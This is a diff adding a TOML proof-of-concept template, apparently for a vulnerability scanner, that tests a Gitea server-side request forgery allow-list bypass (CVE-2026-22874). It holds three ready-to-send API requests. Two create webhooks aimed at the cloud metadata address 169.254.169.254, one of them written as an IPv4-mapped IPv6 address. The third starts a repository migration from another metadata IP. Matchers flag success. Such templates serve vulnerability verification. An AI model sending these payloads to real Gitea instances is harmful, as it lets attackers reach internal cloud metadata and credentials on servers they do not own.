@@ -1,0 +1,88 @@
+[info]
+author = "AVE"
+description = "验证 Gitea <= 1.26.2 的 Webhook/Migration SSRF 允许列表绕过漏洞。通过 IPv4-mapped IPv6 地址（如 [::ffff:169.254.169.254]）或云元数据 IP（169.254.169.254）绕过 Go net.IP.IsPrivate() 的过滤限制，访问云服务元数据接口。"
+id = "POC-AVE-2026-0248"
+name = "CVE-2026-22874 Gitea SSRF Allow-List Bypass PoC"
+severity = "critical"
+tags = [
+    "cve-2026-22874",
+    "gitea",
+    "ssrf",
+    "allowlist-bypass",
+]
+vuln_id = [
+    "CVE-2026-22874",
+    "AVE-2026-0248",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/{{username}}/{{repo}}/hooks"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"type":"gitea","config":{"url":"http://[::ffff:169.254.169.254]/latest/meta-data/","content_type":"json"},"events":["push"],"active":true}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "id",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/{{username}}/{{repo}}/hooks"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"type":"gitea","config":{"url":"http://169.254.169.254/latest/meta-data/","content_type":"json"},"events":["push"],"active":true}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "id",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/migrate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"clone_addr":"http://[::ffff:100.100.100.200]/","repo_name":"ssrf-test-{{randstr}}","uid":1,"service":"git"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "id",
+]
